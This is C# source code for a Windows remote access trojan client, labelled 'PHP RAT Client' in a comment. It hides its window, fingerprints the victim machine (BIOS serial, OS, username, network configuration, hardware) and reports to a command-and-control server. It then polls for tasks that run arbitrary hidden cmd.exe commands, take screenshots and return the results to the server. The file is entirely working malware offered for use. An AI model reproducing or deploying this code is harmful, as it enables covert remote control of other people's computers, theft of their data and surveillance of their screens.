using System;
using System.Collections.Generic;
using System.Management;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Timers;
using System.Threading.Tasks;
using System.Windows.Forms;
using Newtonsoft.Json.Linq;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Drawing.Imaging;
using System.Linq;
using System.Net;

namespace raju
{
    public partial class ClientForm : Form
    {
        private static readonly HttpClient client = new HttpClient();

        private String shyaamAddress = "http://server_address/";
        private String machineID;

        private JToken baburaoResponse = null;

        private JArray queueArray = new JArray();
        private JArray processedTasks = new JArray();

        private System.Timers.Timer queueCheckTimer;
        private System.Timers.Timer queueProcessTimer;

        public ClientForm()
        {
            InitializeComponent();
        }

        private async Task<String> SendGETRequestAsync(string path)
        {
            var response = await client.GetAsync(path);
            var responseString = await response.Content.ReadAsStringAsync();

            return responseString;
        }

        private async Task<JToken> SendPOSTRequestAsync(string path, Dictionary<string, string> data)
        {
            var content = new FormUrlEncodedContent(data);
            var response = await client.PostAsync(path, content);
            var responseString = await response.Content.ReadAsStringAsync();

            JToken output = JToken.Parse(responseString);
            return output;
        }

        private async Task<JArray> GetResponseArray(string path)
        {
            JArray responseArray = JArray.Parse(await SendGETRequestAsync(path));

            return responseArray;
        }

        private async Task<JToken> InitiateConnection(string path)
        {
            JToken output = JToken.Parse(await SendGETRequestAsync(path));
            return output;
        }

        private String GetMachineInfo(string table, string item)
        {
            Object search_result = null;
            ManagementObjectSearcher identitySearch = new ManagementObjectSearcher("SELECT * FROM " + table);
            foreach (ManagementObject iter in identitySearch.Get())
            {
                search_result = iter[item];
            }

            return Convert.ToString(search_result);
        }

        private String RunCommandInShell(string cmd)
        {
            Process p = new Process();
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c " + cmd.Trim();
            p.Start();

            string output = p.StandardOutput.ReadToEnd();
            p.WaitForExit();

            return output;
        }

        private string Base64Screenshot()
        {
            using (Bitmap screenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height))
            using (MemoryStream ms = new MemoryStream())
            using (Graphics g = Graphics.FromImage(screenshot))
            {
                g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
                screenshot.Save(ms, ImageFormat.Png);
                return Convert.ToBase64String(ms.GetBuffer());
            }
        }

        private void SetupTimers()
        {
            queueCheckTimer = new System.Timers.Timer(3000);
            queueCheckTimer.Elapsed += new ElapsedEventHandler(this.QueueUpdate);
            queueCheckTimer.Enabled = true;

            queueProcessTimer = new System.Timers.Timer(1000);
            queueProcessTimer.Elapsed += new ElapsedEventHandler(this.QueueProcess);
            queueProcessTimer.Enabled = true;
        }

        private async void ClientForm_LoadAsync(object sender, EventArgs e)
        {
            this.Hide();
            //Console.WriteLine("Starting PHP RAT Client");

            client.BaseAddress = new Uri(shyaamAddress);
            client.DefaultRequestHeaders.Accept.Clear();
            client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));

            machineID = GetMachineInfo("Win32_BIOS", "SerialNumber").Trim();
            baburaoResponse = await InitiateConnection("shyaam/" + machineID);

            if (baburaoResponse.Value<Boolean>("isNew"))
            {
                Dictionary<string, string> info = new Dictionary<string, string>()
                {
                    {"os", GetMachineInfo("Win32_OperatingSystem", "Version") },
                    {"computerName", Environment.MachineName },
                    {"username", Environment.UserName },
                    {"network", RunCommandInShell("ipconfig") },
                    {"cpu", GetMachineInfo("Win32_Processor", "Name") },
                    {"ram", GetMachineInfo("Win32_PhysicalMemory", "Capacity") }
                };

                await SendPOSTRequestAsync("shyaam/" + machineID + "/new", info);
            }

            SetupTimers();
        }

        private async void QueueUpdate(object sender, ElapsedEventArgs e)
        {
            JArray responseArray = await GetResponseArray("shyaam/" + machineID + "/queue");
            QueueCheck(responseArray);
        }

        private void QueueCheck(JArray responseArray)
        {
            foreach (dynamic task in responseArray)
            {
                if (IsNewTask(task))
                {
                    queueArray.Add(task);
                }
            }
        }

        private Boolean IsNewTask(JToken toCheck)
        {
            foreach (JToken task in queueArray.Children())
            {
                if (task.Value<String>("taskId") == toCheck.Value<String>("taskId"))
                {
                    return false;
                }
            }
            foreach (JToken task in processedTasks.Children())
            {
                if (task.Value<String>("taskId") == toCheck.Value<String>("taskId"))
                {
                    return false;
                }
            }

            return true;
        }

        private void QueueProcess(object sender, ElapsedEventArgs e)
        {
            if (queueArray.HasValues)
            {
                TaskProcess(queueArray[0]);
            }
        }

        private void TaskProcess(JToken inputTask)
        {
            queueArray.Remove(inputTask);
            processedTasks.Add(inputTask);

            var data = new Dictionary<string, string>()
                {
                    { "taskId", inputTask.Value<String>("taskId") },
                    { "status", "ok" }
                };

            Console.WriteLine(inputTask.Value<String>("task"));

            switch (inputTask.Value<String>("task"))
            {
                case "msg":
                    MessageBox.Show(inputTask.Value<JArray>("args").First.Value<String>());
                    break;
                case "cmd":
                    data.Add("body", RunCommandInShell(inputTask.Value<JArray>("args").First.Value<String>()));
                    break;
                case "screenshot":
                    data.Add("body", Base64Screenshot());
                    break;
                default:
                    Console.WriteLine("Invalid Task");
                    break;
            }

            PostCompletedTask(data);

        }

        private async void PostCompletedTask(Dictionary<string, string> data)
        {
            var encodedItems = data.Select(i => WebUtility.UrlEncode(i.Key) + "=" + WebUtility.UrlEncode(i.Value));
            var encodedContent = new StringContent(String.Join("&", encodedItems), null, "application/x-www-form-urlencoded");
            await client.PostAsync("shyaam/" + machineID + "/queue", encodedContent);
        }
    }
}
